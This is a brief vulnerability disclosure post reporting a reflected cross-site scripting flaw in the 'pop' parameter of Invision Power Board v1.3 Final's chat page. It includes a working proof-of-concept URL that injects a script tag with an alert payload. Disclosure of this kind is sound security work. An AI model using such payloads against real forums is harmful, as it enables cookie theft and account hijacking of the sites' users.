Subject: Invision Power Board v1.3 Final Cross Site Scripting 2 - Addon


Hi Everyone!
I Just found more XSS at "Invision Power Board v1.3 Final" forum.
This is the new hole:
http://<host>/forum//index.php?s=&act=chat&pop=1;'><script>alert('this could
be your cookie')</script><plaintext>
it is at the "pop" field.
